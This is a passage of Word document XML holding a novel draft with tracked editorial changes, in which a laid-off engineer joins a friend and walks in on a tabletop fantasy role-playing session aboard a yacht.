            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>music</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, watching the space where Jason had been.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would be no Claymore the following day. No 9:30 standup meeting, no bug triage, no competitive analysis reports. None of the ritual or rigmarole that had defined his life for the last six years. And in its place was… nothing. Nothing.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pulled out his cellphone and launched the LinkedIn app. He typically used it to keep in touch with contacts he made at conferences. For the first time ever, the profile he loaded was his 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Six years at Claymore Communications, developing a new cellular multiplexing protocol. And before that, three years at a company that built network appliances. And before that, three years building custom FPGA-based digital radio systems. And before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Not a single company in his entire employment history still existed. He’d gotten in on the ground floor of each one, when they were still under a dozen employees, hoping to ride the wave to prominence. Instead, they all fizzled in the wake of new technologies. The relentless pace of the industry rendered every one of his projects obsolete and </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>useless by the time it could be brought to market.</w:t>
      </w:r>
      <w:ins w:id="334" w:author="TextVet" w:date="2016-03-15T13:13:00Z">
        <w:r w:rsidR="00F10AFC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> The Midas t</w:t>
        </w:r>
        <w:r w:rsidR="009D3A1E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ouch never stank so bad</w:t>
        </w:r>
        <w:r w:rsidR="00F10AFC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> when in reverse.</w:t>
        </w:r>
      </w:ins>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returned to the table. “So…?”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said nothing.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prodded, “With Claymore dead, what else will you do?”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shrugged. “I’ll find some way to spend my time. I’ll hang out at Ada’s Technical Books on Broadway. I’ll tap some local connections in the Maker community and engineering Meetup groups. I’ll…”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gaze drifted downward at his cellphone screen. His own face, with slightly smoother skin and brighter eyes, looked up at him from the LinkedIn headshot. The objective statement beside it read, “Creative, optimistic computer engineer eager to make history in the digital revolution.” It hadn’t been modified in over six years.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commentRangeStart w:id="335"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“I’m in, Jason,” he said. “Let’s make it happen.”</w:t>
      </w:r>
      <w:commentRangeEnd w:id="335"/>
      <w:r w:rsidR="00BC1B2F">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="335"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>4</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Krongor’s</w:t>
      </w:r>
      <w:ins w:id="336" w:author="TextVet" w:date="2016-03-15T13:18:00Z">
        <w:r w:rsidR="00675385">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:smallCaps/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>battleaxe split the orc’s skull</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> in half, spraying the cavern wall with black ichor as the creature fell lifeless at the barbarian’s feet.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Several paces ahead, Zhan quickly chanted arcane syllables. With a hand that suddenly glowed white, the wizard grabbed a nearby orc. Arcs of lightning surged through its body as its vibrato screams echoed through the cavern. The air filled with the stench of ozone and burning hair. The monster fell, twitching but lifeless.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veritable army of the beasts surrounded Krongor. The warrior’s axe cleaved through another orc’s torso. Yet</w:t>
      </w:r>
      <w:ins w:id="337" w:author="TextVet" w:date="2016-03-15T13:19:00Z">
        <w:r w:rsidR="00247B79">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no sooner had the foe fallen than </w:t>
      </w:r>
      <w:ins w:id="338" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidR="00EF25FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>the next</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="339" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF25FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>o</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="340" w:author="TextVet" w:date="2016-03-15T13:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00247B79">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>n</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="341" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF25FC">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xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="342" w:author="TextVet" w:date="2016-03-15T13:21:00Z">
        <w:r w:rsidR="00247B79">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>doppelganger</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="343" w:author="TextVet" w:date="2016-03-15T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00247B79">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>of its comrades</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="344" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF25FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>advanced</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="345" w:author="TextVet" w:date="2016-03-15T13:21:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00247B79">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> to</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="346" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EF25FC">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fill</w:t>
      </w:r>
      <w:ins w:id="347" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidR="00EF25FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ed</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> its place</w:t>
      </w:r>
      <w:ins w:id="348" w:author="TextVet" w:date="2016-03-15T13:22:00Z">
        <w:r w:rsidR="00EF25FC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, advancing</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Zhan pointed toward the barbarian and shouted another incantation — and in an instant, Krongor was engulfed in an inferno. All he could see was flame. The very air around him set alight, singeing his hair</w:t>
      </w:r>
      <w:ins w:id="349" w:author="TextVet" w:date="2016-03-15T13:23:00Z">
        <w:r w:rsidR="00A33A9A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="350" w:author="TextVet" w:date="2016-03-15T13:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A33A9A">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blistering his skin.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just as quickly as the fire had appeared, it vanished. The cavern was silent, save for the sizzling</w:t>
      </w:r>
      <w:del w:id="351" w:author="TextVet" w:date="2016-03-15T13:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005B22B5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> from the burnt</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="352" w:author="TextVet" w:date="2016-03-15T13:24:00Z">
        <w:r w:rsidR="00544BB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>orc</w:t>
        </w:r>
        <w:r w:rsidR="00544BB1" w:rsidRPr="000D3488">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remains</w:t>
      </w:r>
      <w:del w:id="353" w:author="TextVet" w:date="2016-03-15T13:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00544BB1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of the orcs</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Amidst a circle of ashen bodies, Krongor collapsed to his knees in agony. “You idiot!” he growled.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sorry!” cried Zhan. “They were all around you! It </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>did</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> kill them all, at least…”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Smoke still rose from the barbarian’s flesh. He gritted his teeth, keeping himself conscious solely through strength of will. “Stupid wizards! Just use your damn hocus-pocus to patch me up, will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Zhan nodded apologetically. He sat beside Krongor in a meditative pose and began whispering prayers to Eir, Goddess of Healing. The deity’s love reached even down into these dark pits. As he prayed, Krongor’s wounds closed</w:t>
      </w:r>
      <w:ins w:id="354" w:author="TextVet" w:date="2016-03-15T13:25:00Z">
        <w:r w:rsidR="00233A3F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="355" w:author="TextVet" w:date="2016-03-15T13:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00233A3F">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vanish</w:t>
      </w:r>
      <w:ins w:id="356" w:author="TextVet" w:date="2016-03-15T13:26:00Z">
        <w:r w:rsidR="00233A3F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="357" w:author="TextVet" w:date="2016-03-15T13:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00233A3F">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before his eyes.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="003C2C5C" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="358" w:author="TextVet" w:date="2016-03-15T13:26:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>S</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="359" w:author="TextVet" w:date="2016-03-15T13:26:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003C2C5C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ome dispute </w:t>
      </w:r>
      <w:ins w:id="360" w:author="TextVet" w:date="2016-03-15T13:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">remained </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">over whether </w:t>
      </w:r>
      <w:del w:id="361" w:author="TextVet" w:date="2016-03-15T13:27:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="003C2C5C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">or not </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>that actually happened.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00F86333" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:before="480" w:after="480" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:pict>
          <v:rect id="_x0000_i1025" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pic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don’t care what you think I said before!” insisted Moshen. “He has </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="362" w:author="TextVet" w:date="2016-03-15T13:28:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> healing spells!”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a scrawny Asian kid with thick glasses, sat at the head of a lacquered table, on a leather bench that wrapped along the walls of a yacht’s wood-paneled cabin. His face was mostly obscured by a laminated cardboard screen bearing pictures of knights and dragons. The table held a disorganized pile of books, dice, and Cheetos. At the center, atop a plastic sheet with a hexagonal grid, stood two-inch painted pewter figurines — one axe-wielding barbarian, one wizard, and several orc figures lying face-down.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is bullshit!” Mike fired back, waving a handful of papers. He was dark-haired and tall, well-muscled but too fat and scruffy to show definition. “When we were in Salavina, I remember Zhan going to the Temple of Eir and learning a healing spell from the High Priestess.” He turned to his side. “Didn’t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Tuttle sat next to Mike, chugging a soda and adding up experience points on a worn character sheet. “She taught me a prayer for good health, Mike. She didn’t grant me the authority to channel the power of her god.”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talked me into helping you fight through these orc-infested caverns, and you can’t even cast any healing spells!?”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quit being such a munchkin!” Moshen insisted. “It doesn’t make any sense for wizards to heal! Wizards throw lightning bolts and fireballs. </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="363" w:author="TextVet" w:date="2016-03-15T13:30:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>Priests</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> manipulate life energies. They operate on </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="364" w:author="TextVet" w:date="2016-03-15T13:30:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>completely</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> incompatible principles.”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shrugged. “Wizards can’t cast healing spells, dude. Everybody knows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“Give me Zhan’s character sheet, Jason,” Mike demanded.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put a hand over the paper. “Why…?”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Wielding an eraser with menace, Mike declared, “I’m going to change him into a barbarian.”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Jason’s face was a mask of horror. “Don’t even think about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“Try and stop me!” Mike snatched at Zhan’s character sheet. Jason yanked it away and held it at arm’s length. Mike tried to reach around Jason, but he wouldn’t yield. The two grown men slapped at each other and wrestled on the cabin bench for control of the paper.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365" w:author="TextVet" w:date="2016-03-15T13:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Their bickering was interrupted by </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="366" w:author="TextVet" w:date="2016-03-15T13:33:00Z">
        <w:r w:rsidR="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>F</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="367" w:author="TextVet" w:date="2016-03-15T13:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>f</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ootsteps </w:t>
      </w:r>
      <w:ins w:id="368" w:author="TextVet" w:date="2016-03-15T13:33:00Z">
        <w:r w:rsidR="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">from </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>above</w:t>
      </w:r>
      <w:ins w:id="369" w:author="TextVet" w:date="2016-03-15T13:33:00Z">
        <w:r w:rsidR="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="370" w:author="TextVet" w:date="2016-03-15T13:34:00Z">
        <w:r w:rsidR="00601237">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pressed them to a truce</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Through the portholes</w:t>
      </w:r>
      <w:ins w:id="371" w:author="TextVet" w:date="2016-03-15T13:35:00Z">
        <w:r w:rsidR="00601237">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they could see jeans and hiking boots. The visitor knelt down to peer inside. Danny’s face appeared in a porthole. Jason pointed to the entrance.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“Hey,” Danny said as he descended the steep stairs into the cabin. “Oh good, I got the right boat.”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waved hello. “Come on in, Danny. Meet the gang.”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around. On one end of the cabin was a large flat</w:t>
      </w:r>
      <w:ins w:id="372" w:author="TextVet" w:date="2016-03-15T13:36:00Z">
        <w:r w:rsidR="00E74ED9">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screen TV. On the other end, he saw the table covered with rulebooks, figurines, and soda cans. He instantly recognized the scene. He’d walked into a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
